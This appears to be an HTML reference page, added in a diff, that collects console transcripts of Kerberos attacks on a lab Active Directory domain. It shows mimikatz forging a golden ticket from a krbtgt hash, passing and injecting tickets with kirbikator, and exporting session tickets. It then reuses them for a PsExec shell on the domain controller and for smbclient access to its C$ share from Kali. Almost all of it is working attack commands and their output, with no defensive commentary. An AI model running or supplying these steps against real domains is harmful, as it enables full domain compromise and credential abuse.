@@ -1,0 +1,216 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Attackerkb Reference</title>
+</head><body>mimikatz # kerberos::<br/>
+ERROR mimikatz_doLocal ; "(null)" command of "kerberos" module not found !<br/>
+<br/>
+Module : &nbsp; &nbsp; &nbsp; &nbsp;kerberos<br/>
+Full name : &nbsp; &nbsp; Kerberos package module<br/>
+Description :<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ptt &nbsp;- &nbsp;Pass-the-ticket [NT 6]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; list &nbsp;- &nbsp;List ticket(s)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;tgt &nbsp;- &nbsp;Retrieve current TGT<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;purge &nbsp;- &nbsp;Purge ticket(s)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; golden &nbsp;- &nbsp;Willy Wonka factory<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hash &nbsp;- &nbsp;Hash password to keys<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ptc &nbsp;- &nbsp;Pass-the-ccache [NT6]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;clist &nbsp;- &nbsp;List tickets in MIT/Heimdall ccache<br/>
+<br/>
+<b>Golden Ticket &nbsp;</b><br/>
+mimikatz # kerberos::golden /user:Administrator /domain:sittingduck.info /sid:S-<br/>
+1-5-21-2792304509-1851296738-3446580569 /krbtgt:994ceb7e251e5afc550eef79d8172d64<br/>
+&nbsp;/ticket:gold.kirbi<br/>
+User &nbsp; &nbsp; &nbsp;: Administrator<br/>
+Domain &nbsp; &nbsp;: sittingduck.info<br/>
+SID &nbsp; &nbsp; &nbsp; : S-1-5-21-2792304509-1851296738-3446580569<br/>
+User Id &nbsp; : 500<br/>
+Groups Id : *513 512 520 518 519<br/>
+ServiceKey: 994ceb7e251e5afc550eef79d8172d64 - rc4_hmac_nt<br/>
+Lifetime &nbsp;: 10/26/2015 11:28:54 PM ; 10/23/2025 11:28:54 PM ; 10/23/2025 11:28:5<br/>
+4 PM<br/>
+-&gt; Ticket : gold.kirbi<br/>
+<br/>
+&nbsp;* PAC generated<br/>
+&nbsp;* PAC signed<br/>
+&nbsp;* EncTicketPart generated<br/>
+&nbsp;* EncTicketPart encrypted<br/>
+&nbsp;* KrbCred generated<br/>
+<br/>
+Final Ticket Saved to file !<br/>
+<br/>
+<br/>
+<b>Pass the Ticket</b><br/>
+mimikatz # kerberos::ptt gold.kirbi<br/>
+&nbsp; 0 - File 'gold.kirbi' : OK<br/>
+<br/>
+mimikatz # kerberos::list<br/>
+<br/>
+[00000000] - 0x00000017 - rc4_hmac_nt<br/>
+&nbsp; &nbsp;Start/End/MaxRenew: 10/26/2015 11:28:54 PM ; 10/23/2025 11:28:54 PM ; 10/23/2<br/>
+025 11:28:54 PM<br/>
+&nbsp; &nbsp;Server Name &nbsp; &nbsp; &nbsp; : krbtgt/sittingduck.info @ sittingduck.info<br/>
+&nbsp; &nbsp;Client Name &nbsp; &nbsp; &nbsp; : Administrator @ sittingduck.info<br/>
+&nbsp; &nbsp;Flags 40e00000 &nbsp; &nbsp;: pre_authent ; initial ; renewable ; forwardable ;<br/>
+<br/>
+<br/>
+<b>Injecting tickets with Kirbikator</b><br/>
+C:\Users\notanadmin\Desktop&gt;kirbikator.exe lsa gold.kirbi<br/>
+<br/>
+Destination : Microsoft LSA API (multiple)<br/>
+&nbsp;&lt; gold.kirbi (RFC KRB-CRED (#22))<br/>
+&nbsp;&gt; Ticket Administrator@sittingduck.info-krbtgt~sittingduck.info@sittingduck.inf<br/>
+o : injected<br/>
+<br/>
+<br/>
+<b>Exporting active tickets &nbsp;</b><br/>
+mimikatz # kerberos::list /export<br/>
+<br/>
+[00000000] - 0x00000012 - aes256_hmac<br/>
+&nbsp; &nbsp;Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201<br/>
+5 11:39:31 PM<br/>
+&nbsp; &nbsp;Server Name &nbsp; &nbsp; &nbsp; : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Client Name &nbsp; &nbsp; &nbsp; : uberuser @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Flags 60a10000 &nbsp; &nbsp;: name_canonicalize ; pre_authent ; renewable ; forwarded ;<br/>
+&nbsp;forwardable ;<br/>
+&nbsp; &nbsp;* Saved to file &nbsp; &nbsp; : 0-60a10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK<br/>
+.INFO.kirbi<br/>
+<br/>
+[00000001] - 0x00000012 - aes256_hmac<br/>
+&nbsp; &nbsp;Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/201<br/>
+5 11:39:31 PM<br/>
+&nbsp; &nbsp;Server Name &nbsp; &nbsp; &nbsp; : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Client Name &nbsp; &nbsp; &nbsp; : uberuser @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Flags 40e10000 &nbsp; &nbsp;: name_canonicalize ; pre_authent ; initial ; renewable ; f<br/>
+orwardable ;<br/>
+&nbsp; &nbsp;* Saved to file &nbsp; &nbsp; : 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK<br/>
+.INFO.kirbi<br/>
+<br/>
+[00000002] - 0x00000012 - aes256_hmac<br/>
+&nbsp; &nbsp;Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201<br/>
+5 11:39:31 PM<br/>
+&nbsp; &nbsp;Server Name &nbsp; &nbsp; &nbsp; : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Client Name &nbsp; &nbsp; &nbsp; : uberuser @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Flags 40a50000 &nbsp; &nbsp;: name_canonicalize ; ok_as_delegate ; pre_authent ; renewa<br/>
+ble ; forwardable ;<br/>
+&nbsp; &nbsp;* Saved to file &nbsp; &nbsp; : 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDU<br/>
+CK.INFO.kirbi<br/>
+<br/>
+[00000003] - 0x00000012 - aes256_hmac<br/>
+&nbsp; &nbsp;Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201<br/>
+5 11:39:31 PM<br/>
+&nbsp; &nbsp;Server Name &nbsp; &nbsp; &nbsp; : ldap/dc1.sittingduck.info @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Client Name &nbsp; &nbsp; &nbsp; : uberuser @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Flags 40a50000 &nbsp; &nbsp;: name_canonicalize ; ok_as_delegate ; pre_authent ; renewa<br/>
+ble ; forwardable ;<br/>
+&nbsp; &nbsp;* Saved to file &nbsp; &nbsp; : 3-40a50000-uberuser@ldap~dc1.sittingduck.info-SITTINGDU<br/>
+CK.INFO.kirbi<br/>
+<br/>
+[00000004] - 0x00000012 - aes256_hmac<br/>
+&nbsp; &nbsp;Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/201<br/>
+5 11:39:31 PM<br/>
+&nbsp; &nbsp;Server Name &nbsp; &nbsp; &nbsp; : LDAP/dc1.sittingduck.info/sittingduck.info @ SITTINGDUCK.<br/>
+INFO<br/>
+&nbsp; &nbsp;Client Name &nbsp; &nbsp; &nbsp; : uberuser @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Flags 40a50000 &nbsp; &nbsp;: name_canonicalize ; ok_as_delegate ; pre_authent ; renewa<br/>
+ble ; forwardable ;<br/>
+&nbsp; &nbsp;* Saved to file &nbsp; &nbsp; : 4-40a50000-uberuser@LDAP~dc1.sittingduck.info~sittingdu<br/>
+ck.info-SITTINGDUCK.INFO.kirbi<br/>
+<br/>
+<b>PSEXEC with standard Kerberos tickets &nbsp;</b><br/>
+mimikatz # kerberos::list<br/>
+<br/>
+mimikatz # (EMPTY LIST)<br/>
+<br/>
+mimikatz # kerberos::ptt 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK<br/>
+.INFO.kirbi<br/>
+&nbsp; 0 - File '1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi'<br/>
+: OK<br/>
+<br/>
+mimikatz # kerberos::ptt 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDU<br/>
+CK.INFO.kirbi<br/>
+&nbsp; 0 - File '2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi<br/>
+' : OK<br/>
+<br/>
+mimikatz # kerberos::list<br/>
+<br/>
+[00000000] - 0x00000012 - aes256_hmac<br/>
+&nbsp; &nbsp;Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/201<br/>
+5 11:39:31 PM<br/>
+&nbsp; &nbsp;Server Name &nbsp; &nbsp; &nbsp; : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Client Name &nbsp; &nbsp; &nbsp; : uberuser @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Flags 40e10000 &nbsp; &nbsp;: name_canonicalize ; pre_authent ; initial ; renewable ; f<br/>
+orwardable ;<br/>
+<br/>
+[00000001] - 0x00000012 - aes256_hmac<br/>
+&nbsp; &nbsp;Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201<br/>
+5 11:39:31 PM<br/>
+&nbsp; &nbsp;Server Name &nbsp; &nbsp; &nbsp; : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Client Name &nbsp; &nbsp; &nbsp; : uberuser @ SITTINGDUCK.INFO<br/>
+&nbsp; &nbsp;Flags 40a50000 &nbsp; &nbsp;: name_canonicalize ; ok_as_delegate ; pre_authent ; renewa<br/>
+ble ; forwardable ;<br/>
+<br/>
+mimikatz #<br/>
+<br/>
+C:\Users\notanadmin\Desktop&gt;psexec \\dc1 cmd.exe<br/>
+<br/>
+PsExec v1.97 - Execute processes remotely<br/>
+Copyright (C) 2001-2009 Mark Russinovich<br/>
+Sysinternals - www.sysinternals.com<br/>
+<br/>
+<br/>
+Microsoft Windows [Version 6.3.9600]<br/>
+(c) 2013 Microsoft Corporation. All rights reserved.<br/>
+<br/>
+C:\Windows\system32&gt;whoami<br/>
+sittingduck\uberuser<br/>
+<br/>
+C:\Windows\system32&gt;echo %COMPUTERNAME%<br/>
+DC1<br/>
+<br/>
+C:\Windows\system32&gt;<br/>
+<br/>
+<b>Convert Mimikatz Kerberos ticket to CCache and use &nbsp;</b><br/>
+C:\Users\notanadmin\Desktop&gt;kirbikator.exe ccache "2-40a50000-uberuser@cifs~dc1.<br/>
+sittingduck.info-SITTINGDUCK.INFO.kirbi"<br/>
+<br/>
+Destination : MIT Credential Cache (simple)<br/>
+&nbsp;&lt; 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi (RFC KRB<br/>
+-CRED (#22))<br/>
+&nbsp;&gt; Single file : uberuser@SITTINGDUCK.INFO.ccache<br/>
+<br/>
+C:\Users\notanadmin\Desktop&gt;<br/>
+<br/>
+<b>&nbsp;Method 1</b><br/>
+KRB5CCNAME=uberuser@SITTINGDUCK.INFO.ccache smbclient -k //dc1.sittingduck.info/c$<br/>
+OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]<br/>
+smb: \&gt;<br/>
+<br/>
+<b>&nbsp;Method 2 &nbsp;</b><br/>
+root@kali:~# apt-get install krb5-user<br/>
+Reading package lists... Done<br/>
+Building dependency tree &nbsp; &nbsp; &nbsp; <br/>
+Reading state information... Done<br/>
+The following extra packages will be installed:<br/>
+&nbsp; krb5-config libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-7<br/>
+Suggested packages:<br/>
+&nbsp; krb5-doc<br/>
+The following NEW packages will be installed:<br/>
+&nbsp; krb5-config krb5-user libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-7<br/>
+0 upgraded, 6 newly installed, 0 to remove and 0 not upgraded.<br/>
+Need to get 466 kB of archives.<br/>
+After this operation, 1,199 kB of additional disk space will be used.<br/>
+Do you want to continue? [Y/n] y<br/>
+0% [Connecting to http.kali.org]<br/>
+&lt;SNIP&gt;<br/>
+&lt;SNIP&gt;<br/>
+&lt;SNIP&gt;<br/>
+<br/>
+root@kali:~/Desktop# klist<br/>
+klist: Credentials cache file '/tmp/krb5cc_0' not found<br/>
+root@kali:~/Desktop# cp uberuser@SITTINGDUCK.INFO.ccache /tmp/krb5cc_0<br/>
+root@kali:~/Desktop# smbclient -k //dc1.sittingduck.info/c$<br/>
+OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]<br/>
+smb: \&gt;</body></html>
